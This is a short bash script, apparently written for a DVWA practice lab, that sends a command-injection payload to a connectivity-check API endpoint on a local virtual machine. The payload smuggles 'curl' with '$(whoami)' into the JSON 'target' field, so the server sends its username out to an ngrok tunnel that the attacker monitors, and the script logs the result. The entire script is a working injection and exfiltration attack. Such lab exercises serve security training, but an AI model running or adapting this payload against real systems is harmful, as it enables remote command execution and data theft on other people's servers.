#!/bin/bash

{
echo "Attempting to send system-level username to server..."
echo "---------------------------------------------------"
RESPONSE=$(curl -X POST \
  -H "Content-Type: application/json" \
  -d '{ "target":"127.0.0.1;curl https://multichanneled-alkalimetrically-rayford.ngrok-free.dev?cmd=$(whoami)" }' \
  http://192.168.56.105/DVWA/vulnerabilities/api/v2/health/connectivity)
STATUS=$(echo "$RESPONSE" | jq -r '.status')
echo "Request status: $STATUS"
echo ""
echo "Check terminal where you pasted python -m http.server 8000 to get the username"
}> /home/kali/api_high.log
